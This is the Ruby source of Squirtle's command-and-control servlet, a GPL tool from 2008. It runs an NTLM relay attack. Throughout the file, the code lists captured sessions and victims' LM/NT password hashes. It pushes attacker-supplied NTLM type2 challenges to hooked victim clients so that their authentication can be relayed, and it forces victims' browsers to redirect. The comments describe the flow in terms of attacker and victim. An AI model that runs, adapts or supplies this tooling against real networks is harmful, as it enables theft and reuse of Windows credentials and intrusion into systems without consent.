# Squirtle's Command and Control nerve center. List clients, hashes, status, etc. 
#
# Copyright (C) 2008  Kurt Grutzmacher
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

class ControllerServlet < HTTPServlet::AbstractServlet
	def do_GET(req, resp)
			
		HTTPAuth.basic_auth(req, resp, "Squirtle Realm") {|user, pass|
      # this block returns true if
      # authentication token is valid
      user == $config['user'] && pass == $config['pass']
    }

		path = req.unparsed_uri
		resp.body = '{ "status": "invalid command" }'

		# create a response body based upon the URI path
		resp.body = listsessions if /^\/controller\/listsessions/io =~ path
		resp.body = listhashes if /^\/controller\/allhashes/io =~ path or /^\/controller\/allusers/io =~ path
		resp.body = listuser(req) if /^\/controller\/listuser/io =~ path
		resp.body = listsession(req) if /^\/controller\/session/io =~ path
		resp.body = clientredirect(req) if /^\/controller\/redirect/io =~ path
		resp.body = staticnonce_request(req) if /^\/controller\/static/io =~ path
		resp.body = type2_request(req) if /^\/controller\/type2/io =~ path
		resp.body = clearsession(req) if /^\/controller\/clearsession/io =~ path

		resp.status = 200
		resp['Content-Type'] = "application/jsonrequest"
		
	end
	alias do_POST do_GET
	
	# static nonce request
	def staticnonce_request(req)
		#  Take the Session Key and search for it in the Sessions hash.
		#  If client exists and has communicated to the controller within
		#  the configured timeout, add a request in the session database
		key = req.query['key'] or return '{"status": "no key provided"}'
		session = Session.find(:first, :conditions => [ "key_id = ?", key])
		if session != nil then
			session.function = "static"
			session.url = "/client/auth/" + srand.to_s
			if req.query['nonce'] != nil then
				session.nonce = req.query['nonce']
			else
				session.nonce = $config['nonce'].unpack('h*')
			end
			response = '{ "status": "ok" }'
			begin
				nonce = session.nonce.unpack('h*')
			rescue
				response = '{ "status": "bad nonce" }'
			end
			session.type2_base64 = ""
			session.save
		else
			# invalid!
			response = '{"status": "invalid session key"}'
		end
					
		return response
	end
	
	# type2 base64 request
	def type2_request(req)
		# Basic theory here is the attacking program has already started an NTLM
		# handshake with the server which is waiting for a response. This means
		# the server flags and nonce has been passed so the attacker can either
		# send the segmented data (domain, server, dns, nonce and flags) or a
		# base64 type2 message. In return the controller will push a type2
		# request in the queue for the victim to authenticate to. The result will
		# be returned to the attacker in JSON format for processing. If all goes
		# well then authentication succeeds! Dutchie passed!
		
		key = req.query['key'] or return '{ "status": "no key provided" }'
		session = Session.find(:first, :conditions => [ "key_id = ?", key])
		if session != nil then
			if req.query['type2'] == nil then
				# attacker supplied data vs. base64 type2 message
				domain = req.query['domain'] or $config['domain']
				server = req.query['server'] or $config['server']
				dns_domain = req.query['dns_domain'] or $config['dns_domain']
				dns_name = "#{server.downcase}.#{dns_domain}"
				begin
					nonce = req.query['nonce'].to_a.pack('h*')
				rescue
					return '{ "status": "error processing nonce or no nonce provided" }'
				end
				begin
					reqflags = req.query['flags'].to_a.pack('h8')
				rescue
					return '{ "status": "error processing request flags or no flags provided" }'
				end
				type2 = Rex::Proto::SMB::Utils.create_type2_message(reqflags, nonce, domain, server, dns_name, dns_domain, downgrade=false)
			else
				type2 = req.query['type2']
			end
			
			decode = Rex::Text.decode_base64(type2)
			if decode[8] == 2 then
				# we have a type 2 request, add request!
				session.function = "type2"
				session.url = "/client/auth/" + srand.to_s
				session.type2_base64 = type2
				session.nonce = ""
				session.save

				# do five cycles to wait for the response from client
				response = '{ "status": "no response" }'
				(1..5).each do |loopcicle|
					sleep($config['timeout']/1000)	# timeout is in milliseconds
					session = Session.find(:first, :conditions => [ "key_id = ?", key ])
					if session != nil then
						if session.result != nil
							response = {"status" => "ok", "timestamp" => session.timestamp, "result" => session.result }.to_json
							#response = '{ "status": "ok", "timestamp": "' + session.timestamp + '", "result": "' + session.result + '" }'
							break
						end
					else
						puts "[!] Error: Session seems to have dissappeared! key = #{key}\n"
						break
					end
				end # cycles
			end # if decode
		else
			response = '{"status": "no session found"}'
		end
		
		return response
	end
		
	# list all sessions, latest first.
	def listsessions
		response = Hash.new
		response['status'] = "ok"
		response['sessions'] = {}
		sessions = Session.find(:all, :order => "timestamp DESC")
		sessions.each { |s|
			response['sessions'][s.key_id] = {}
			response['sessions'][s.key_id]['timestamp'] = s.timestamp
			response['sessions'][s.key_id]['function'] = s.function
			response['sessions'][s.key_id]['url'] = s.url
			response['sessions'][s.key_id]['nonce'] = s.nonce
			response['sessions'][s.key_id]['type2'] = s.type2_base64
			response['sessions'][s.key_id]['domain'] = s.domain
			response['sessions'][s.key_id]['server'] = s.server
			response['sessions'][s.key_id]['dns_name'] = s.dns_name
			response['sessions'][s.key_id]['dns_domain'] = s.dns_domain
			response['sessions'][s.key_id]['result'] = s.result
		}
		#print "response: #{response}"
		
		return response.to_json
	end

	# list all users and their hashes
	def listhashes
		response = Hash.new
		response['status'] = "ok"
		response['hashes'] = {}
		users = User.find(:all, :order => "timestamp DESC")
		users.each { |u|
			response['hashes'][u.key] = {}
			response['hashes'][u.key]['timestamp'] = u.timestamp
			response['hashes'][u.key]['user'] = u.user
			response['hashes'][u.key]['workstation'] = u.workstation
			response['hashes'][u.key]['domain'] = u.domain
			response['hashes'][u.key]['nonce'] = u.nonce
			response['hashes'][u.key]['lm'] = u.lm
			response['hashes'][u.key]['nt'] = u.nt
		}
		#print "response: #{response}"
		
		return response.to_json
	end

	# list a specific username's hashes
	def listuser(req)
		user = req.query['user'] or return '{ "status": "no user specified" }'
		response = Hash.new
		response['status'] = "ok"
		response['hashes'] = {}
		users = User.find(:all, :order => "timestamp DESC", :conditions => ["upper(user) = ?", user.upcase ] )
		if users == nil then
			response['status'] = "user not found"
		else
			users.each { |u|
					response['hashes'][u.key] = {}
					response['hashes'][u.key]['timestamp'] = u.timestamp
					response['hashes'][u.key]['user'] = u.user
					response['hashes'][u.key]['workstation'] = u.workstation
					response['hashes'][u.key]['domain'] = u.domain
					response['hashes'][u.key]['nonce'] = u.nonce
					response['hashes'][u.key]['lm'] = u.lm
					response['hashes'][u.key]['nt'] = u.nt
				}
			end

			return response.to_json
	end
	
	# list a specific session key
	def listsession(req)
		key = req.query['key'] or return '{ "status": "no key specified" }'
		response = Hash.new
		response['status'] = "ok"
		response['sessions'] = {}
		s = Session.find(:first, :conditions => [ "key_id = ?", key])
		if s != nil then
			response['sessions'][s.key_id] = {}
			response['sessions'][s.key_id]['timestamp'] = s.timestamp
			response['sessions'][s.key_id]['function'] = s.function
			response['sessions'][s.key_id]['url'] = s.url
			response['sessions'][s.key_id]['nonce'] = s.nonce
			response['sessions'][s.key_id]['type2'] = s.type2_base64
			response['sessions'][s.key_id]['domain'] = s.domain
			response['sessions'][s.key_id]['server'] = s.server
			response['sessions'][s.key_id]['dns_name'] = s.dns_name
			response['sessions'][s.key_id]['dns_domain'] = s.dns_domain
			response['sessions'][s.key_id]['result'] = s.result
		else
			response['status'] = "session key not found"
		end
		
		return response.to_json
	end

	# clear a session
	def clearsession(req)
		key = req.query['key'] or return '{ "status": "no session key specified" }'
		session = Session.find(:first, :conditions => [ "key_id = ?", key])
		if session != nil then
			session.function = ""
			session.url = ""
			session.nonce = ""
			session.type2_base64 = ""
			session.domain = ""
			session.server = ""
			session.dns_name = ""
			session.dns_domain = ""
			session.result = ""
			session.save
			response = '{"status": "ok"}'
		else
			response = '{"status": "invalid session key"}'
		end
		
		return response
	end
	
	# force client redirection
	def clientredirect(req)
		key = req.query['key'] or return '{"status": "no key provided"}'
		url = req.query['url'] or return '{"status": "no url provided"}'
		response = '{ "status": "ok" }'
		session = Session.find(:first, :conditions => [ "key_id = ?", key])
		if session != nil then
			session.function = "redir"
			session.url = req.query['url']
			session.save
		else
			response = '{ "status": "no session found" }'
		end
		
		return response
	end

end
